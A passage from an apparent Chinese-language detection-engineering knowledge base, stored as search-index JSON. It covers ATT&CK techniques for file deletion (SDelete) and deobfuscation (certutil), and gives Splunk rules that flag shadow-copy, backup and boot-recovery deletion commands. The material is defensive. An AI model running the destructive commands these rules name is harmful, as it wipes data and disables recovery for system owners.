<p>https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4688</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/","title":"T1070-004-win-\u6587\u4ef6\u5220\u9664","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5220\u9664\u5176\u5165\u4fb5\u6d3b\u52a8\u6240\u7559\u4e0b\u7684\u6587\u4ef6\u3002\u653b\u51fb\u8005\u5728\u7cfb\u7edf\u4e0a\u4e22\u5f03\u521b\u5efa\u7684\u6076\u610f\u8f6f\u4ef6\u3001\u5de5\u5177\u6216\u5176\u4ed6\u53ef\u80fd\u4f1a\u7559\u4e0b\u75d5\u8ff9\u7684\u975e\u672c\u673a\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u7684\u5220\u9664\u53ef\u4ee5\u5728\u5165\u4fb5\u8fc7\u7a0b\u4e2d\u8fdb\u884c\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u5165\u4fb5\u540e\u7684\u8fc7\u7a0b\u4e2d\u8fdb\u884c\uff0c\u4ee5\u6700\u5927\u7a0b\u5ea6\u5730\u51cf\u5c11\u653b\u51fb\u8005\u7559\u4e0b\u7684\u8db3\u8ff9\u3002</p> <p>\u4e3b\u673a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5de5\u5177\u6765\u6267\u884c\u6e05\u9664\uff0c\u4f46\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u3002\u5176\u4e2d\u5305\u62ec\u672c\u673acmd\u51fd\u6570\uff08\u4f8b\u5982DEL\uff09\uff0c\u5b89\u5168\u5220\u9664\u5de5\u5177\uff08\u4f8b\u5982Windows Sysinternals SDelete\uff09\u6216\u5176\u4ed6\u7b2c\u4e09\u65b9\u6587\u4ef6\u5220\u9664\u5de5\u5177\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows security</p> <p>windows sysmon</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4f60\u9700\u8981\u5728cmd\u6216powershell\u4e2d\u8c03\u7528\u5b83\u3002</p> <pre><code>\u7528\u6cd5:  \n      sdelete [-p passes] [-r] [-s] [-q] &lt;file or directory&gt; [...]\n      sdelete [-p passes] [-z|-c [percent free]] &lt;drive letter [...]&gt;\n      sdelete [-p passes] [-z|-c] &lt;physical disk number&gt;\n      -c \u6e05\u7406\u53ef\u7528\u7a7a\u95f4\u3002 \u6307\u5b9a\u9009\u9879\u7a7a\u95f4\u91cf  \u7559\u7ed9\u6b63\u5728\u8fd0\u884c\u7684\u7cfb\u7edf\u514d\u8d39\u4f7f\u7528\u3002  \n      -p \u6307\u5b9a\u8986\u76d6\u6b21\u6570\uff08\u9ed8\u8ba4\u4e3a1\uff09  \n      -r \u5220\u9664\u53ea\u8bfb\u5c5e\u6027  \n      -s \u9012\u5f52\u5b50\u76ee\u5f55  \n      -z \u96f6\u53ef\u7528\u7a7a\u95f4\uff08\u9002\u7528\u4e8e\u865a\u62df\u78c1\u76d8\u4f18\u5316\uff09  \n      -nobanner \u4e0d\u663e\u793a\u542f\u52a8\u6807\u8bed\u548c\u7248\u6743\u4fe1\u606f\u3002\u78c1\u76d8\u5fc5\u987b\u6ca1\u6709\u4efb\u4f55\u5377\u624d\u80fd\u88ab\u6e05\u7406\u3002\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u5728\u4e1a\u52a1\u73af\u5883\u4e2d\u627e\u5230\u4e0e\u826f\u6027\u547d\u4ee4\u884c\u529f\u80fd\uff08\u4f8b\u5982DEL\u6216\u7b2c\u4e09\u65b9\u5b9e\u7528\u7a0b\u5e8f\u6216\u5de5\u5177\uff09\u76f8\u5173\u7684\u4e8b\u4ef6\u7684\u60c5\u51b5\u5f88\u5c11\u89c1\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u7528\u6237\u7fa4\u548c\u7cfb\u7edf\u7684\u5178\u578b\u4f7f\u7528\u65b9\u5f0f\u3002\u76d1\u89c6\u547d\u4ee4\u884c\u5220\u9664\u529f\u80fd\u4ee5\u53ca\u76f8\u5173\u4f7f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u6216\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u7684\u5220\u9664\u6587\u4ef6\u8fdb\u884c\u5173\u8054\uff0c\u53ef\u80fd\u4f1a\u5e2e\u52a9\u5b89\u5168\u4eba\u5458\u68c0\u6d4b\u5230\u6076\u610f\u6d3b\u52a8\u3002\u53e6\u4e00\u4e2a\u597d\u7684\u505a\u6cd5\u662f\u76d1\u89c6\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5f15\u5165\u7684\u4f01\u4e1a\u7f51\u7edc\u4e2d\u7cfb\u7edf\u4e0a\u5c1a\u672a\u5b58\u5728\u7684\u5df2\u77e5\u5220\u9664\u548c\u5b89\u5168\u5220\u9664\u5de5\u5177\u3002\u67d0\u4e9b\u76d1\u89c6\u5de5\u5177\u53ef\u80fd\u4f1a\u6536\u96c6\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4f46\u53ef\u80fd\u65e0\u6cd5\u6355\u83b7DEL\u547d\u4ee4\uff0c\u56e0\u4e3aDEL\u662fcmd.exe\u4e2d\u7684\u672c\u673a\u51fd\u6570\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#splunk","title":"splunk\u89c4\u5219","text":"<pre><code>index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image IN (\u201c*\\\\sdelete.exe\u201d , \u201c*\\\\vssadmin.exe\u201d , \u201c*\\\\wmic.exe\u201d , \u201c*\\\\bcdedit.exe\u201d , \u201c*\\\\wbadmin.exe\u201d)) \n\nindex=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\vssadmin.exe\u201d CommandLine=\u201d*Delete Shadows*\u201d)\n\nindex=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\wmic.exe\u201d CommandLine=\u201d*shadowcopy delete*\u201d)\n\nindex=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\bcdedit.exe\u201d CommandLine IN (\u201c*bootstatuspolicy ignoreallfailures*\u201d , \u201c*recoveryenabled no*\u201d))\n\nindex=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\wbadmin.exe\u201d CommandLine=\u201d*Delete*\u201d)\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_6","title":"\u5efa\u8bae","text":"<p>\u5982\u679c\u4f60\u5bf9windows\u6709\u8db3\u591f\u591a\u7684\u4e86\u89e3\uff0c\u90a3\u4e48\u76f8\u4fe1\u4f60\u4e5f\u77e5\u9053\u5e94\u8be5\u5982\u4f55\u53bb\u7528Windows\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\u6b64\u7c7b\u653b\u51fb\u884c\u4e3a\uff0c\u6bd4\u5982\u4f9d\u97604688\u4e2d\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-004-win-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1070-004</p> <p>https://attack.mitre.org/techniques/T1070/004/</p> <p>windows\u4f7f\u7528sdelete\u5b89\u5168\u7684\u5220\u9664\u6587\u4ef6</p> <p>https://www.cnblogs.com/douzilink/p/13297433.html</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/","title":"T1140-win-\u53bb\u6df7\u6dc6/\u89e3\u7801\u6587\u4ef6\u6216\u4fe1\u606f","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u6df7\u6dc6\u6587\u4ef6\u6216\u4fe1\u606f\u6765\u9690\u85cf\u5165\u4fb5\u3002\u4ed6\u4eec\u53ef\u80fd\u9700\u8981\u5355\u72ec\u7684\u673a\u5236\u6765\u89e3\u7801\u6216\u6a21\u7cca\u5904\u7406\u8be5\u4fe1\u606f\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u4ed6\u4eec\u6253\u7b97\u5982\u4f55\u4f7f\u7528\u5b83\u3002\u8fd9\u6837\u505a\u7684\u65b9\u6cd5\u5305\u62ec\u5185\u7f6e\u6076\u610f\u8f6f\u4ef6\u529f\u80fd\u6216\u4f7f\u7528\u7cfb\u7edf\u4e0a\u5b58\u5728\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002</p> <p>\u7ecf\u5178\u7684\u4f8b\u5b50\u5c31\u662f\u4f7f\u7528certutil\u89e3\u7801\u5df2\u9690\u85cf\u5728\u8bc1\u4e66\u6587\u4ef6\u4e2d\u7684\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\uff0c\u53ef\u79fb\u690d\u53ef\u6267\u884c\u6587\u4ef6\u3002\u53e6\u4e00\u4e2a\u7ecf\u5178\u7684\u4f8b\u5b50\u662f\u4f7f\u7528Windowscopy /b\u547d\u4ee4\u5c06\u4e8c\u8fdb\u5236\u7247\u6bb5\u91cd\u7ec4\u4e3a\u6076\u610f\u6709\u6548\u8d1f\u8f7d\u3002</p> <p>\u6709\u65f6\uff0c\u4f5c\u4e3a\u7528\u6237\u6267\u884c\u7684\u4e00\u90e8\u5206\uff0c\u53ef\u80fd\u9700\u8981\u6253\u5f00\u7528\u6237\u7684\u64cd\u4f5c\u4ee5\u5bf9\u5176\u8fdb\u884c\u53bb\u6a21\u7cca\u5316\u6216\u89e3\u5bc6\u64cd\u4f5c\u3002\u53ef\u80fd\u8fd8\u8981\u6c42\u7528\u6237\u8f93\u5165\u5bc6\u7801\u4ee5\u6253\u5f00\u7531\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u53d7\u5bc6\u7801\u4fdd\u62a4\u7684\u538b\u7f29/\u52a0\u5bc6\u6587\u4ef6\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>Certutil.exe\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u7a0b\u5e8f\uff0c\u4f5c\u4e3a\u8bc1\u4e66\u670d\u52a1\u7684\u4e00\u90e8\u5206\u5b89\u88c5\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528Certutil.exe\u8f6c\u50a8\u548c\u663e\u793a\u8bc1\u4e66\u9881\u53d1\u673a\u6784\uff08CA\uff09\u914d\u7f6e\u4fe1\u606f\uff0c\u914d\u7f6e\u8bc1\u4e66\u670d\u52a1\uff0c\u5907\u4efd\u548c\u8fd8\u539fCA\u7ec4\u4ef6\uff0c\u4ee5\u53ca\u9a8c\u8bc1\u8bc1\u4e66\uff0c\u5bc6\u94a5\u5bf9\u548c\u8bc1\u4e66\u94fe\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows security</p> <p>windows sysmon</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u7b80\u5355\u7684\u4ecb\u7ecd\u4e00\u4e0bCertutil \u5de5\u5177\u7684\u4f7f\u7528\u65b9\u6cd5</p> <pre><code>certutil/?\n\n\u52a8\u8bcd:\n  -dump             -- \u8f6c\u50a8\u914d\u7f6e\u4fe1\u606f\u6216\u6587\u4ef6\n  -dumpPFX          -- \u8f6c\u50a8 PFX \u7ed3\u6784\n  -asn              -- \u5206\u6790 ASN.1 \u6587\u4ef6\n\n  -decodehex        -- \u89e3\u7801\u5341\u516d\u8fdb\u5236\u7f16\u7801\u7684\u6587\u4ef6\n  -decode           -- \u89e3\u7801 Base64 \u7f16\u7801\u7684\u6587\u4ef6\n  -encode           -- \u5c06\u6587\u4ef6\u7f16\u7801\u4e3a Base64\n\n  -deny             -- \u62d2\u7edd\u6302\u8d77\u7684\u7533\u8bf7\n  -resubmit         -- \u91cd\u65b0\u63d0\u4ea4\u6302\u8d77\u7684\u7533\u8bf7\n  -setattributes    -- \u4e3a\u6302\u8d77\u7533\u8bf7\u8bbe\u7f6e\u5c5e\u6027\n  -setextension     -- \u4e3a\u6302\u8d77\u7533\u8bf7\u8bbe\u7f6e\u6269\u5c55\n  -revoke           -- \u540a\u9500\u8bc1\u4e66\n  -isvalid          -- \u663e\u793a\u5f53\u524d\u8bc1\u4e66\u90e8\u7f72\n\n  -getconfig        -- \u83b7\u53d6\u9ed8\u8ba4\u914d\u7f6e\u5b57\u7b26\u4e32\n  -ping             -- Ping Active Directory \u8bc1\u4e66\u670d\u52a1\u7533\u8bf7\u63a5\u53e3\n  -pingadmin        -- Ping Active Directory \u8bc1\u4e66\u670d\u52a1\u7ba1\u7406\u63a5\u53e3\n  -CAInfo           -- \u663e\u793a CA \u4fe1\u606f\n  -ca.cert          -- \u68c0\u7d22 CA \u7684\u8bc1\u4e66\n  -ca.chain         -- \u68c0\u7d22 CA \u7684\u8bc1\u4e66\u94fe\n  -GetCRL           -- \u83b7\u53d6 CRL\n  -CRL              -- \u53d1\u5e03\u65b0\u7684 CRL [\u6216\u4ec5\u589e\u91cf CRL]\n  -shutdown         -- \u5173\u95ed Active Directory \u8bc1\u4e66\u670d\u52a1\n\n  -installCert      -- \u5b89\u88c5\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u8bc1\u4e66\n  -renewCert        -- \u7eed\u8ba2\u8bc1\u4e66\u9881\u53d1\u673a\u6784\u8bc1\u4e66\n\n  -schema           -- \u8f6c\u50a8\u8bc1\u4e66\u67b6\u6784\n  -view             -- \u8f6c\u50a8\u8bc1\u4e66\u89c6\u56fe\n  -db               -- \u8f6c\u50a8\u539f\u59cb\u6570\u636e\u5e93\n  -deleterow        -- \u5220\u9664\u670d\u52a1\u5668\u6570\u636e\u5e93\u884c\n\n  -backup           -- \u5907\u4efd Active Directory \u8bc1\u4e66\u670d\u52a1\n  -backupDB         -- \u5907\u4efd Active Directory \u8bc1\u4e66\u670d\u52a1\u6570\u636e\u5e93\n  -backupKey        -- \u5907\u4efd Active Directory \u8bc1\u4e66\u670d\u52a1\u8bc1\u4e66\u548c\u79c1\u94a5\n  -restore          -- \u8fd8\u539f Active Directory \u8bc1\u4e66\u670d\u52a1\n  -restoreDB        -- \u8fd8\u539f Active Directory \u8bc1\u4e66\u670d\u52a1\u6570\u636e\u5e93\n  -restoreKey       -- \u8fd8\u539f Active Directory \u8bc1\u4e66\u670d\u52a1\u8bc1\u4e66\u548c\u79c1\u94a5\n  -importPFX        -- \u5bfc\u5165\u8bc1\u4e66\u548c\u79c1\u94a5\n  -dynamicfilelist  -- \u663e\u793a\u52a8\u6001\u6587\u4ef6\u5217\u8868\n  -databaselocations -- \u663e\u793a\u6570\u636e\u5e93\u4f4d\u7f6e\n  -hashfile         -- \u901a\u8fc7\u6587\u4ef6\u751f\u6210\u5e76\u663e\u793a\u52a0\u5bc6\u54c8\u5e0c\n\n  -store            -- \u8f6c\u50a8\u8bc1\u4e66\u5b58\u50a8\n  -enumstore        -- \u679a\u4e3e\u8bc1\u4e66\u5b58\u50a8\n  -addstore         -- \u5c06\u8bc1\u4e66\u6dfb\u52a0\u5230\u5b58\u50a8\n  -delstore         -- \u4ece\u5b58\u50a8\u5220\u9664\u8bc1\u4e66\n  -verifystore      -- \u9a8c\u8bc1\u5b58\u50a8\u4e2d\u7684\u8bc1\u4e66\n  -repairstore      -- \u4fee\u590d\u5bc6\u94a5\u5173\u8054\uff0c\u6216\u8005\u66f4\u65b0\u8bc1\u4e66\u5c5e\u6027\u6216\u5bc6\u94a5\u5b89\u5168\u63cf\u8ff0\u7b26\n  -viewstore        -- \u8f6c\u50a8\u8bc1\u4e66\u5b58\u50a8\n  -viewdelstore     -- \u4ece\u5b58\u50a8\u5220\u9664\u8bc1\u4e66\n  -UI               -- \u8c03\u7528 CryptUI\n  -attest           -- \u9a8c\u8bc1\u5bc6\u94a5\u8bc1\u660e\u8bf7\u6c42\n\n  -dsPublish        -- \u5c06\u8bc1\u4e66\u6216 CRL \u53d1\u5e03\u5230 Active Directory\n\n  -ADTemplate       -- \u663e\u793a AD \u6a21\u677f\n  -Template         -- \u663e\u793a\u6ce8\u518c\u7b56\u7565\u6a21\u677f\n  -TemplateCAs      -- \u663e\u793a\u6a21\u677f\u7684 CA\n  -CATemplates      -- \u663e\u793a CA \u7684\u6a21\u677f\n  -SetCASites       -- \u7ba1\u7406 CA \u7684\u7ad9\u70b9\u540d\u79f0\n  -enrollmentServerURL -- \u663e\u793a\u3001\u6dfb\u52a0\u6216\u5220\u9664\u4e0e CA \u5173\u8054\u7684\u6ce8\u518c\u670d\u52a1\u5668 URL\n  -ADCA             -- \u663e\u793a AD CA\n  -CA               -- \u663e\u793a\u6ce8\u518c\u7b56\u7565 CA\n  -Policy           -- \u663e\u793a\u6ce8\u518c\u7b56\u7565\n  -PolicyCache      -- \u663e\u793a\u6216\u5220\u9664\u6ce8\u518c\u7b56\u7565\u7f13\u5b58\u9879\u76ee\n  -CredStore        -- \u663e\u793a\u3001\u6dfb\u52a0\u6216\u5220\u9664\u51ed\u636e\u5b58\u50a8\u9879\u76ee\n  -InstallDefaultTemplates -- \u5b89\u88c5\u9ed8\u8ba4\u7684\u8bc1\u4e66\u6a21\u677f\n  -URLCache         -- \u663e\u793a\u6216\u5220\u9664 URL \u7f13\u5b58\u9879\u76ee\n  -pulse            -- \u4ee5\u8109\u51b2\u65b9\u5f0f\u6267\u884c\u81ea\u52a8\u6ce8\u518c\u4e8b\u4ef6\u6216 NGC \u4efb\u52a1\n  -MachineInfo      -- \u663e\u793a Active Directory \u8ba1\u7b97\u673a\u5bf9\u8c61\u4fe1\u606f\n  -DCInfo           -- \u663e\u793a\u57df\u63a7\u5236\u5668\u4fe1\u606f\n  -EntInfo          -- \u663e\u793a\u4f01\u4e1a\u4fe1\u606f\n  -TCAInfo          -- \u663e\u793a CA \u4fe1\u606f\n  -SCInfo           -- \u663e\u793a\u667a\u80fd\u5361\u4fe1\u606f\n\n  -SCRoots          -- \u7ba1\u7406\u667a\u80fd\u5361\u6839\u8bc1\u4e66\n\n  -verifykeys       -- \u9a8c\u8bc1\u516c/\u79c1\u94a5\u96c6\n  -verify           -- \u9a8c\u8bc1\u8bc1\u4e66\uff0cCRL \u6216\u94fe\n  -verifyCTL        -- \u9a8c\u8bc1 AuthRoot \u6216\u4e0d\u5141\u8bb8\u7684\u8bc1\u4e66 CTL\n  -syncWithWU       -- \u4e0e Windows \u66f4\u65b0\u540c\u6b65\n  -generateSSTFromWU -- \u901a\u8fc7 Windows \u66f4\u65b0\u751f\u6210 SST\n  -generatePinRulesCTL -- \u751f\u6210\u6346\u7ed1\u89c4\u5219 CTL\n  -downloadOcsp     -- \u4e0b\u8f7d OCSP \u54cd\u5e94\u5e76\u5199\u5165\u76ee\u5f55\n  -generateHpkpHeader -- \u4f7f\u7528\u6307\u5b9a\u6587\u4ef6\u6216\u76ee\u5f55\u4e2d\u7684\u8bc1\u4e66\u751f\u6210 HPKP \u5934\n  -flushCache       -- \u5237\u65b0\u9009\u5b9a\u8fdb\u7a0b(\u4f8b\u5982 lsass.exe)\u4e2d\u7684\u6307\u5b9a\u7f13\u5b58\n  -addEccCurve      -- \u6dfb\u52a0 ECC \u66f2\u7ebf\n  -deleteEccCurve   -- \u5220\u9664 ECC \u66f2\u7ebf\n  -displayEccCurve  -- \u663e\u793a ECC \u66f2\u7ebf\n  -sign             -- \u91cd\u65b0\u7b7e\u540d CRL \u6216\u8bc1\u4e66\n\n  -vroot            -- \u521b\u5efa/\u5220\u9664 Web \u865a\u62df\u6839\u548c\u6587\u4ef6\u5171\u4eab\n  -vocsproot        -- \u521b\u5efa/\u5220\u9664 OCSP Web Proxy \u7684 Web \u865a\u62df\u6839\n  -addEnrollmentServer -- \u6dfb\u52a0\u6ce8\u518c\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f\n  -deleteEnrollmentServer -- \u5220\u9664\u6ce8\u518c\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f\n  -addPolicyServer  -- \u6dfb\u52a0\u7b56\u7565\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f\n  -deletePolicyServer -- \u5220\u9664\u7b56\u7565\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f\n  -oid              -- \u663e\u793a ObjectId \u6216\u8bbe\u7f6e\u663e\u793a\u540d\u79f0\n  -error            -- \u663e\u793a\u9519\u8bef\u4ee3\u7801\u6d88\u606f\u6587\u672c\n  -getreg           -- \u663e\u793a\u6ce8\u518c\u8868\u503c\n  -setreg           -- \u8bbe\u7f6e\u6ce8\u518c\u8868\u503c\n  -delreg           -- \u5220\u9664\u6ce8\u518c\u8868\u503c\n\n  -ImportKMS        -- \u4e3a\u5bc6\u94a5\u5b58\u6863\u5bfc\u5165\u7528\u6237\u5bc6\u94a5\u548c\u8bc1\u4e66\u5230\u670d\u52a1\u5668\u6570\u636e\u5e93\n  -ImportCert       -- \u5c06\u8bc1\u4e66\u6587\u4ef6\u5bfc\u5165\u6570\u636e\u5e93\n  -GetKey           -- \u68c0\u7d22\u5b58\u6863\u7684\u79c1\u94a5\u6062\u590d Blob\uff0c\u751f\u6210\u6062\u590d\u811a\u672c \u6216\u6062\u590d\u5b58\u6863\u7684\u5bc6\u94a5\n  -RecoverKey       -- \u6062\u590d\u5b58\u6863\u7684\u79c1\u94a5\n  -MergePFX         -- \u5408\u5e76 PFX \u6587\u4ef6\n  -ConvertEPF       -- \u5c06 PFX \u6587\u4ef6\u8f6c\u6362\u4e3a EPF \u6587\u4ef6\n\n  -add-chain        -- (-AddChain) \u6dfb\u52a0\u8bc1\u4e66\u94fe\n  -add-pre-chain    -- (-AddPrechain) \u6dfb\u52a0\u9884\u690d\u8bc1\u4e66\u94fe\n  -get-sth          -- (-GetSTH) \u83b7\u53d6\u7b7e\u540d\u6811\u5934\n  -get-sth-consistency -- (-GetSTHConsistency) \u83b7\u53d6\u7b7e\u540d\u6811\u5934\u66f4\u6539\n  -get-proof-by-hash -- (-GetProofByHash) \u83b7\u53d6\u54c8\u5e0c\u8bc1\u660e\n  -get-entries      -- (-GetEntries) \u83b7\u53d6\u9879\n  -get-roots        -- (-GetRoots) \u83b7\u53d6\u6839\n  -get-entry-and-proof -- (-GetEntryAndProof) \u83b7\u53d6\u9879\u548c\u8bc1\u660e\n  -VerifyCT         -- \u9a8c\u8bc1\u8bc1\u4e66 SCT\n  -?                -- \u663e\u793a\u8be5\u7528\u6cd5\u6d88\u606f\n\n\nCertUtil -?              -- \u663e\u793a\u52a8\u8bcd\u5217\u8868(\u547d\u540d\u5217\u8868)\nCertUtil -dump -?        -- \u663e\u793a \"dump\" \u52a8\u8bcd\u7684\u5e2e\u52a9\u6587\u672c\nCertUtil -v -?           -- \u663e\u793a\u6240\u6709\u52a8\u8bcd\u7684\u6240\u6709\u5e2e\u52a9\u6587\u672c\n\nCertUtil: -? \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u6839\u636e\u5b9e\u73b0\u7684\u65b9\u6cd5\u4e0d\u540c\uff0c\u68c0\u6d4b\u53bb\u6df7\u6dc6\u6216\u89e3\u7801\u6587\u4ef6\u4fe1\u606f\u7684\u52a8\u4f5c\u53ef\u80fd\u5f88\u56f0\u96be\u3002\u5982\u679c\u8be5\u529f\u80fd\u5305\u542b\u5728\u6076\u610f\u8f6f\u4ef6\u4e2d\u5e76\u4f7f\u7528Windows API\uff0c\u5219\u4e0e\u5728\u52a0\u8f7d\u7684\u5e93\u6216API\u8c03\u7528\u4e0a\u8fdb\u884c\u5206\u6790\u76f8\u6bd4\uff0c\u5c1d\u8bd5\u5728\u64cd\u4f5c\u4e4b\u524d\u6216\u4e4b\u540e\u68c0\u6d4b\u6076\u610f\u884c\u4e3a\u53ef\u80fd\u4f1a\u4ea7\u751f\u66f4\u597d\u7684\u7ed3\u679c\u3002\u5982\u679c\u4f7f\u7528\u811a\u672c\uff0c\u5219\u53ef\u80fd\u9700\u8981\u6536\u96c6\u811a\u672c\u8fdb\u884c\u5206\u6790\u3002\u6267\u884c\u8fc7\u7a0b\u548c\u547d\u4ee4\u884c\u76d1\u89c6\uff0c\u4ee5\u68c0\u6d4b\u4e0e\u811a\u672c\u548c\u7cfb\u7edf\u5b9e\u7528\u7a0b\u5e8f\uff08\u5982certutil\uff09\u6709\u5173\u7684\u6f5c\u5728\u6076\u610f\u884c\u4e3a\u3002</p> <p>\u76d1\u89c6\u5e38\u89c1\u5f52\u6863\u6587\u4ef6\u5e94\u7528\u7a0b\u5e8f\u548c\u6269\u5c55\u7684\u6267\u884c\u6587\u4ef6\u8def\u5f84\u548c\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4f8b\u5982Zip\u548cRAR\u5f52\u6863\u5de5\u5177\u7684\u6269\u5c55\uff0c\u5e76\u4e0e\u5176\u4ed6\u53ef\u7591\u884c\u4e3a\u76f8\u5173\u8054\uff0c\u4ee5\u51cf\u5c11\u6765\u81ea\u6b63\u5e38\u7528\u6237\u548c\u7ba1\u7406\u5458\u884c\u4e3a\u7684\u8bef\u62a5.</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1140-win-%E5%8E%BB%E6%B7%B7%E6%B7%86%E8%A7%A3%E7%A0%81%E6%96%87%E4%BB%B6%E6%88%96%E4%BF%A1%E6%81%AF/#splunk","title":"splunk\u89c4\u5219","text":"<pre><code>index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d 